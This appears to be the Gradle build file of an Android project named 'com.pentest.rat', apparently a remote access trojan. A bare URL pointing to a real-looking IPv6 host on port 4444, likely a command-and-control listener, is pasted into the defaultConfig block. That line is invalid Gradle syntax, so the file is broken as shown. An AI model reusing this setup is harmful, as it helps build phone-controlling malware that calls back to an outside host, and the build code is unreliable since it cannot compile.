plugins {
    id("com.android.application")
    id("org.jetbrains.kotlin.android")
}

android {
    namespace = "com.pentest.rat"
    compileSdk = 34
    defaultConfig {
        applicationId = "com.pentest.rat"
        minSdk = 26
        targetSdk = 34
        versionCode = 1
        versionName = "1.0"
        http://[2409:40d0:1396:c264:8000::]:4444
    }
    buildFeatures { buildConfig = true }
    compileOptions {
        sourceCompatibility = JavaVersion.VERSION_17
        targetCompatibility = JavaVersion.VERSION_17
    }
    kotlinOptions { jvmTarget = "17" }
}

dependencies {
    implementation("com.squareup.okhttp3:okhttp:4.12.0")
    implementation("org.jetbrains.kotlinx:kotlinx-coroutines-android:1.8.1")
}
